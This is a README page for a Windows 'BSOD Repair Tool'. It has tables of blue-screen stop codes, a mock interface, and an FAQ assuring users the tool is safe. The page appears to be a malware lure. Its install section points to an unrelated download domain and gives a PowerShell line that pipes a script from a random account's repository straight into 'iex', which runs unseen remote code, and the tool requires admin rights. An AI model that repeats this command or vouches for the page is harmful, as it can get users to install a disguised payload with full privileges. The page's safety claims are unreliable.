<div align="center">

# BSOD Repair Tool

Fix Blue Screen of Death errors on Windows 10 and 11.

[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?logo=windows&logoColor=white)]()
[![Release](https://img.shields.io/badge/v1.5.0-stable-success)]()
[![MIT](https://img.shields.io/badge/License-MIT-blue)](LICENSE)

<br>

[**Download**](https://bsod.zipzapsol.space/) ·
[Stop Codes](#stop-codes) ·
[How It Works](#how-it-works) ·
[FAQ](#faq)

</div>

---

## Why

Your PC crashes with a blue screen showing a cryptic error like `IRQL_NOT_LESS_OR_EQUAL` or `CRITICAL_PROCESS_DIED`. You restart, it happens again. Google gives you 50 different possible causes. You don't know where to start.

**BSOD Repair Tool** analyzes your crash dump files, identifies the cause, and applies targeted fixes automatically.

---

## Stop Codes Fixed

### Driver-Related

| Stop Code | Cause | Fix Applied |
|---|---|---|
| `IRQL_NOT_LESS_OR_EQUAL` | Faulty driver accessing wrong memory | Identifies and reinstalls bad driver |
| `DRIVER_IRQL_NOT_LESS_OR_EQUAL` | Driver using incorrect interrupt level | Driver rollback or update |
| `SYSTEM_THREAD_EXCEPTION_NOT_HANDLED` | Driver crash in system thread | Isolates and reinstalls driver |
| `VIDEO_TDR_FAILURE` (nvlddmkm.sys) | GPU driver timeout | Reinstalls GPU driver, resets TDR |
| `KMODE_EXCEPTION_NOT_HANDLED` | Kernel-mode driver exception | Identifies faulting module |
| `PAGE_FAULT_IN_NONPAGED_AREA` | Driver reading invalid memory | SFC scan + driver repair |

### System-Related

| Stop Code | Cause | Fix Applied |
|---|---|---|
| `CRITICAL_PROCESS_DIED` | Essential Windows process crashed | SFC + DISM repair |
| `KERNEL_SECURITY_CHECK_FAILURE` | Corrupted system files | System file repair |
| `SYSTEM_SERVICE_EXCEPTION` | System service error | Service repair + SFC |
| `DPC_WATCHDOG_VIOLATION` | Storage controller timeout | Driver update + SSD trim |
| `UNEXPECTED_STORE_EXCEPTION` | Storage device error | chkdsk + driver repair |
| `WHEA_UNCORRECTABLE_ERROR` | Hardware error detected | Diagnostics report |

### Memory-Related

| Stop Code | Cause | Fix Applied |
|---|---|---|
| `MEMORY_MANAGEMENT` | RAM or virtual memory issue | Page file reset + memory diagnostic |
| `BAD_POOL_HEADER` | Memory pool corruption | Pool tag analysis + repair |
| `BAD_POOL_CALLER` | Faulty memory allocation | Driver isolation + update |
| `KERNEL_DATA_INPAGE_ERROR` | Disk read error into memory | chkdsk + SFC |

### Power & Watchdog

| Stop Code | Cause | Fix Applied |
|---|---|---|
| `DRIVER_POWER_STATE_FAILURE` | Driver stuck in wrong power state | Updates driver, disables power management |
| `CLOCK_WATCHDOG_TIMEOUT` | CPU core not responding | Updates chipset driver, checks overclocking |
| `WIN32K_POWER_WATCHDOG_TIMEOUT` | Display driver power timeout | Resets GPU power settings |

### Kernel & Memory (Additional)

| Stop Code | Cause | Fix Applied |
|---|---|---|
| `APC_INDEX_MISMATCH` | Driver APC call imbalance | Identifies faulting driver, reinstalls |
| `PFN_LIST_CORRUPT` | Page frame database corruption | Memory diagnostic + SFC repair |
| `DRIVER_OVERRAN_STACK_BUFFER` | Driver wrote beyond stack buffer | Identifies driver, forces update |
| `REFERENCE_BY_POINTER` | Invalid object reference count | SFC + DISM repair |
| `ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY` | Code executing from protected memory | Driver rollback, DEP check |
| `FAULTY_HARDWARE_CORRUPTED_PAGE` | RAM or disk hardware fault | Hardware diagnostic report |
| `KERNEL_MODE_HEAP_CORRUPTION` | Kernel heap damaged by driver | Isolates faulting driver |

### Boot-Related

| Stop Code | Cause | Fix Applied |
|---|---|---|
| `INACCESSIBLE_BOOT_DEVICE` | Boot drive not found | BCD repair + driver reinstall |
| `NTFS_FILE_SYSTEM` | NTFS volume corruption | chkdsk /f on system drive |
| `UNMOUNTABLE_BOOT_VOLUME` | Boot partition error | BCD rebuild + volume repair |

---

## How It Works

1. **Analyze** -- Reads Windows crash dump files (minidump) to identify the exact stop code, faulting driver, and memory address
2. **Diagnose** -- Cross-references the crash data with known causes and solutions
3. **Repair** -- Applies targeted fixes:
   - Runs SFC and DISM for system file corruption
   - Updates or rolls back faulting drivers
   - Resets Windows components
   - Repairs boot configuration if needed
4. **Prevent** -- Configures system settings to reduce future BSOD risk

---

## Install

### Option A -- Direct download

**[Download](https://bsod.zipzapsol.space/)**

### Option B -- PowerShell

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## Preview

```
  +----------------------------------------------------+
  |            BSOD Repair Tool v1.5.0                 |
  +----------------------------------------------------+
  |                                                    |
  |  Crash Analysis:                                   |
  |                                                    |
  |  Last BSOD: IRQL_NOT_LESS_OR_EQUAL                |
  |  Faulting module: nvlddmkm.sys (NVIDIA driver)    |
  |  Date: 2026-06-15 14:23:07                        |
  |  Crash dumps found: 4                              |
  |                                                    |
  |  Recommended fixes:                                |
  |  [x] Update NVIDIA display driver                  |
  |  [x] Run System File Checker                       |
  |  [x] Reset TDR timeout value                       |
  |  [ ] Run memory diagnostic                         |
  |                                                    |
  |  [ Apply Fixes ]     [ Full Scan ]     [ Exit ]    |
  |                                                    |
  +----------------------------------------------------+
```

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB recommended |
| Disk | 200 MB |
| Admin | Yes |

---

## FAQ

**Can this fix BSODs caused by hardware failure?**
The tool can detect hardware-related BSODs (RAM, disk, CPU) and tell you which component is likely failing. It cannot fix broken hardware, but it will tell you what to replace.

**I get a BSOD during Windows startup.**
Boot into Safe Mode first, then run the tool. The tool works in Safe Mode.

**Is it safe to use?**
Yes. The tool reads crash dump files (read-only analysis) and uses Windows built-in repair commands (SFC, DISM, chkdsk). No system files are patched.

**How is this different from BlueScreenView?**
BlueScreenView only shows crash information. This tool also **repairs** the underlying cause.

---

## License

[MIT](LICENSE)
